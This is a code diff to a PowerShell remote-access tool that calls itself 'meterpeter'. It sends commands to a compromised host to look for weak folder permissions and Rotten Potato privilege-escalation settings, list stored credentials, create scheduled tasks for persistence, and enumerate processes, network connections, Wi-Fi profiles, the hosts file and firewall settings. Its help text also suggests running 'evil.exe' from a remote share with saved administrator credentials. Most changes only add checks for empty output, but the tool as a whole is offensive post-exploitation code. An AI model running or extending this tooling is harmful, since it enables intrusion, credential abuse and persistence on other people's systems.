@@ -456,7 +456,7 @@ While($Client.Connected)
         $my_choise = Read-Host;
         If($my_choise -eq "Check" -or $my_choise -eq "check")
         {
-          write-host " List Remote-Host Folder Permitions (icacls)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;
+          write-host " List Remote-Host Folder Permissions (icacls)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;
           write-host " - Input Remote Folder Path (`$env:tmp): " -NoNewline;
           $RfPath = Read-Host;write-host "`n`n";
           $Command = "icacls `"$RfPath`" `> dellog.txt;Get-Content dellog.txt;remove-item dellog.txt -Force";
@@ -467,9 +467,7 @@ While($Client.Connected)
           write-host " { Search for 'Everyone:(F)' Permissions starting in Input dir }" -ForegroundColor Green;
           write-host " - Input Remote Folder Path (`$env:tmp): " -NoNewline;
           $RfPath = Read-Host;Write-Host "`n`n";
-          #$Command = "icacls `"$RfPath\*`"|findstr /C:`"Everyone:(F)`" `> WeakFP.txt;`$a = Get-Content WeakFP.txt|findstr `"Everyone:(OI)(CI)(F)`";If(`$a){Get-Content WeakFP.txt;remove-item WeakFP.txt -Force}else{echo `"   None Weak Folder Permissions Found (Everyone (OI) (CI) (F)) ..`" `> WeakFP.txt;Get-Content WeakFP.txt;remove-item WeakFP.txt -Force}";
-          #$Command = "cmd /R icacls `"$RfPath\*`" `> `$env:tmp\WeakDirs.txt;`$check_ACL = get-content `$env:tmp\WeakDirs.txt|findstr /C:`"Everyone:`"|findstr /C:`"(F)`";If(`$check_ACL){Get-Content `$env:tmp\WeakDirs.txt;remove-item `$env:tmp\WeakDirs.txt -Force}else{echo `"   None Weak Folders Permissions Found [ Everyone:(F) ] ..`" `> `$env:tmp\Weak.txt;Get-Content `$env:tmp\Weak.txt;Remove-Item `$env:tmp\Weak.txt -Force;remove-item `$env:tmp\WeakDirs.txt -Force}";
-          $Command = "cmd /R icacls `"$RfPath\*`" `> `$env:tmp\WeakDirs.txt;`$check_ACL = get-content `$env:tmp\WeakDirs.txt|findstr /C:`"Everyone:`"|findstr /C:`"(F)`";If(`$check_ACL){Get-Content `$env:tmp\WeakDirs.txt;remove-item `$env:tmp\WeakDirs.txt -Force}else{echo `"   None Weak Folders Permissions Found [ Everyone:(F) ] ..`" `> `$env:tmp\Weak.txt;Get-Content `$env:tmp\Weak.txt;Remove-Item `$env:tmp\Weak.txt -Force;remove-item `$env:tmp\WeakDirs.txt -Force}";
+          $Command = "icacls `"$RfPath\*`" `> `$env:tmp\WeakDirs.txt;`$check_ACL = get-content `$env:tmp\WeakDirs.txt|findstr /C:`"Everyone:`"|findstr /C:`"(F)`";If(`$check_ACL){Get-Content `$env:tmp\WeakDirs.txt;remove-item `$env:tmp\WeakDirs.txt -Force}else{echo `"   [i] None Weak Folders Permissions Found [ Everyone:(F) ] ..`" `> `$env:tmp\Weak.txt;Get-Content `$env:tmp\Weak.txt;Remove-Item `$env:tmp\Weak.txt -Force;remove-item `$env:tmp\WeakDirs.txt -Force}";
        }
         If($my_choise -eq "Service" -or $my_choise -eq "service")
         {
@@ -479,7 +477,7 @@ While($Client.Connected)
         If($my_choise -eq "RottenP" -or $my_choise -eq "rotten")
         {
           write-host " Search for Rotten Potato Vulnerability." -ForegroundColor Blue -BackgroundColor White;write-host "`n`n";Start-Sleep -Seconds 1;
-          $Command = "cmd /c whoami /priv|findstr /i /C:`"SeImpersonatePrivilege`" /C:`"SeAssignPrimaryPrivilege`" /C:`"SeTcbPrivilege`" /C:`"SeBackupPrivilege`" /C:`"SeRestorePrivilege`" /C:`"SeCreateTokenPrivilege`" /C:`"SeLoadDriverPrivilege`" /C:`"SeTakeOwnershipPrivilege`" /C:`"SeDebugPrivileges`" /C:`"SeTakeOwnershipPrivilege`" `> WeakDirs.txt;`$check_ACL = get-content WeakDirs.txt|findstr /i /C:`"Enabled`";If(`$check_ACL){echo `"[i] Rotten Potato Vulnerability Found ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt;Get-Content WeakDirs.txt;remove-item WeakDirs.txt -Force}else{echo `"   None Weak Permissions Found [ Rotten Potato ] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Remove-Item WeakDirs.txt -Force}";
+          $Command = "cmd /R whoami /priv|findstr /i /C:`"SeImpersonatePrivilege`" /C:`"SeAssignPrimaryPrivilege`" /C:`"SeTcbPrivilege`" /C:`"SeBackupPrivilege`" /C:`"SeRestorePrivilege`" /C:`"SeCreateTokenPrivilege`" /C:`"SeLoadDriverPrivilege`" /C:`"SeTakeOwnershipPrivilege`" /C:`"SeDebugPrivileges`" /C:`"SeTakeOwnershipPrivilege`" `> WeakDirs.txt;`$check_ACL = get-content WeakDirs.txt|findstr /i /C:`"Enabled`";If(`$check_ACL){echo `"[i] Rotten Potato Vulnerable Settings Found ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt;Get-Content WeakDirs.txt;remove-item WeakDirs.txt -Force}else{echo `"   [i] None Weak Permissions Found [ Rotten Potato ] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Remove-Item WeakDirs.txt -Force}";
        }
         If($my_choise -eq "Return" -or $my_choise -eq "return" -or $my_choise -eq "cls" -or $my_choise -eq "Modules" -or $my_choise -eq "modules" -or $my_choise -eq "clear")
         {
@@ -496,9 +494,9 @@ While($Client.Connected)
       If($choise -eq "ListCred" -or $choise -eq "cred")
       {
         write-host " List of Remote-Host cmdkey stored Credentials." -ForegroundColor Blue -BackgroundColor White;
-        write-host " Attacker can then use runas with the /savecred options in order to use the saved credentials." -ForegroundColor Green;
+        write-host " Attacker can then use runas with the /savecred options in order to use the saved creds." -ForegroundColor Green;
         write-host " runas /savecred /user:WORKGROUP\Administrator `"\\10.XXX.XXX.XXX\SHARE\evil.exe`"" -ForegroundColor Green;Start-Sleep -Seconds 2;write-host "`n`n";
-        $Command = "cmdkey /list `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+        $Command = "cmd /R cmdkey /list `> dellog.txt;`$check_keys = Get-Content dellog.txt;If(-not (`$check_keys)){echo `"   [i] None Stored Credentials Found ...`" `> test.txt;Get-Content text.txt;Remove-Item text.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
       }
       If($choise -eq "StartUp" -or $choise -eq "start")
       {
@@ -527,14 +525,14 @@ While($Client.Connected)
           write-host " List of Remote-Host Schedule Tasks." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
           write-host "TaskName                                 Schedule               Status" -ForegroundColor green;
           write-host "--------                                 --------               ------";
-          $Command = "cmd /R schtasks|findstr `"Ready Running`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force";
+          $Command = "cmd /R schtasks|findstr `"Ready Running`" `> schedule.txt;`$check_tasks = Get-content schedule.txt;If(-not (`$check_tasks)){echo `"   [i] None schedule Task found in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-content schedule.txt;Remove-Item schedule.txt -Force}";
         }
         If($my_choise -eq "Inform" -or $my_choise -eq "info")
         {
           write-Host " - Input TaskName: " -NoNewline;
           $TaskName = Read-Host;
           write-host " Retriving '$TaskName' Task Verbose Information ." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "cmd /R schtasks /Query /tn `"$TaskName`" /v /fo list `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force";
+          $Command = "cmd /R schtasks /Query /tn `"$TaskName`" /v /fo list `> schedule.txt;`$check_tasks = Get-content schedule.txt;If(-not (`$check_tasks)){echo `"   [i] None schedule Task found in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-content schedule.txt;Remove-Item schedule.txt -Force}";
         }
         If($my_choise -eq "Create" -or $my_choise -eq "Create")
         {
@@ -549,14 +547,14 @@ While($Client.Connected)
           write-Host " - Input Command|Binary Path: " -NoNewline;
           $execapi = Read-Host;
           write-host "[*] This task wil have the max duration of $Display_dur" -ForegroundColor green;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$TaskName`" /tr `"$execapi`" /du $Task_duration;schtasks /Query /tn `"$TaskName`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force";
+          $Command = "cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$TaskName`" /tr `"$execapi`" /du $Task_duration;schtasks /Query /tn `"$TaskName`" `> schedule.txt;`$check_tasks = Get-content schedule.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to create Task in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-content schedule.txt;Remove-Item schedule.txt -Force}";
         }
         If($my_choise -eq "Delete" -or $my_choise -eq "Delete")
         {
           write-Host " - Input TaskName: " -NoNewline -ForeGroundColor Red;
           $TaskName = Read-Host;
           write-host " Deleting Remote '$TaskName' Task." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "cmd /R schtasks /Delete /tn `"$TaskName`" /f `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force";  
+          $Command = "cmd /R schtasks /Delete /tn `"$TaskName`" /f `> schedule.txt;`$check_tasks = Get-content schedule.txt;If(-not (`$check_tasks)){echo `"   [i] None Task Name: $TaskName found in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-content schedule.txt;Remove-Item schedule.txt -Force}";  
         }
         If($my_choise -eq "Return" -or $my_choise -eq "return" -or $my_choise -eq "cls" -or $my_choise -eq "Modules" -or $my_choise -eq "modules" -or $my_choise -eq "clear")
         {
@@ -576,7 +574,7 @@ While($Client.Connected)
         If($wifi_choise -eq "Check" -or $wifi_choise -eq "check")
         {
         write-host " List of Remote-Host Processe(s) Runing." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-        $Command = "Get-Process|Select-Object Name,Path,Company,Product,StartTime `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+        $Command = "Get-Process|Select-Object Name,Path,Company,Product,StartTime `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve Processes ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
         }
         If($wifi_choise -eq "KillProc" -or $wifi_choise -eq "kill")
         {
@@ -605,12 +603,12 @@ While($Client.Connected)
         write-host " List of Remote-Host Active TCP Connections." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
         Write-Host "  Proto  Local                  Remote                 Status          PID" -ForeGroundColor green;
         Write-Host "  -----  -----                  ------                 ------          ---";
-        $Command = "cmd /R netstat -ano|findstr `"ESTABLISHED`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+        $Command = "cmd /R netstat -ano|findstr `"ESTABLISHED`" `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] None 'ESTABLISHED' Connection Found ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
       }
       If($choise -eq "ListIpv4" -or $choise -eq "ipv4")
       {
         write-host " List of Remote-Host IPv4 Network Statistics." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-        $Command = "cmd /R netstat -s -p ip `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+        $Command = "cmd /R netstat -s -p ip `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve IPv4 statistics ...`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
       }      
       If($choise -eq "ListWifi" -or $choise -eq "wifi")
       {
@@ -626,17 +624,17 @@ While($Client.Connected)
         If($wifi_choise -eq "ListProf" -or $wifi_choise -eq "prof")
         {
           write-host " Remote-Host Profile Statistics." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "cmd /R Netsh WLAN show interface `> pro.txt;Get-Content pro.txt;Remove-Item pro.txt -Force";          
+          $Command = "cmd /R Netsh WLAN show interface `> pro.txt;`$check_tasks = Get-content pro.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve wifi profile ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item pro.txt -Force}else{Get-Content pro.txt;Remove-Item pro.txt -Force}";          
         }
         If($wifi_choise -eq "ListNetw" -or $wifi_choise -eq "netw")
         {
           write-host " List Available wifi Networks." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "cmd /R Netsh wlan show networks `> pro.txt;Get-Content pro.txt;Remove-Item pro.txt -Force";          
+          $Command = "cmd /R Netsh wlan show networks `> pro.txt;`$check_tasks = Get-content pro.txt;If(-not (`$check_tasks)){echo `"   [i] None networks list found in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item pro.txt -Force}else{Get-Content pro.txt;Remove-Item pro.txt -Force}";          
         }
         If($wifi_choise -eq "ListSSID" -or $wifi_choise -eq "ssid")
         {
           write-host " List of Remote-Host SSID profiles." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "cmd /R Netsh WLAN show profiles `> ssid.txt;get-content ssid.txt;Remove-Item ssid.txt";
+          $Command = "cmd /R Netsh WLAN show profiles `> ssid.txt;`$check_tasks = Get-content ssid.txt;If(-not (`$check_tasks)){echo `"   [i] None SSID profile found in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item ssid.txt -Force}else{Get-Content ssid.txt;Remove-Item ssid.txt -Force}";
         }
         If($wifi_choise -eq "SSIDPass" -or $wifi_choise -eq "pass")
         {
@@ -1136,7 +1134,7 @@ While($Client.Connected)
         If($choise_two -eq "Check" -or $choise_two -eq "check")
         {
           write-host " Review hosts File Settings .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "Get-Content `$env:windir\System32\drivers\etc\hosts `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+          $Command = "Get-Content `$env:windir\System32\drivers\etc\hosts `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve: $Remote_Host hosts file ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
         }
         If($choise_two -eq "Spoof" -or $choise_two -eq "spoof")
         {
@@ -1177,7 +1175,7 @@ While($Client.Connected)
         If($choise_two -eq "Check" -or $choise_two -eq "check")
         {
           write-host " Review Remote Firewall Settings (allprofiles)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "cmd /R netsh advfirewall show allprofiles `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+          $Command = "cmd /R netsh advfirewall show allprofiles `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve firewall settings ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
         }
         If($choise_two -eq "Disable" -or $choise_two -eq "off")
         {
